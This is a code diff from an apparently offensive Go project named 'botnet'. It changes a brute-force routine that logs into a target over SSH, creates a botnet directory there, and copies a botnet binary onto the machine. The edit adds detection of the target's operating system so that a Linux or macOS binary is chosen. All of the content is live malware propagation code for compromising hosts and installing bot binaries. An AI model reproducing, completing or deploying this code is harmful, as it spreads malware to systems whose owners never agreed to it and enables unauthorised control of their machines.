@@ -118,6 +118,11 @@ func (a *Attack) bruteForce(host string) {
 	}
 	sess.Close()
 
+	nodeOS := "linux"
+	if strings.Contains(string(out), "Users") {
+		nodeOS = "osx"
+	}
+
 	// create the botnet bin path
 	fmt.Println("[*] creating botnet bin dir")
 	sess, err = getSSHSession(c.host, c.username, c.password)
@@ -132,7 +137,7 @@ func (a *Attack) bruteForce(host string) {
 	}
 	sess.Close()
 
-	if err := scp("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/linux/botnet", strings.TrimSpace(string(out))+"/botnet/bin", c); err != nil {
+	if err := scp("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/"+nodeOS+"/botnet", strings.TrimSpace(string(out))+"/botnet/bin", c); err != nil {
 		fmt.Printf("[ERROR] sending botnet binary %v\n", err)
 		return
 	}
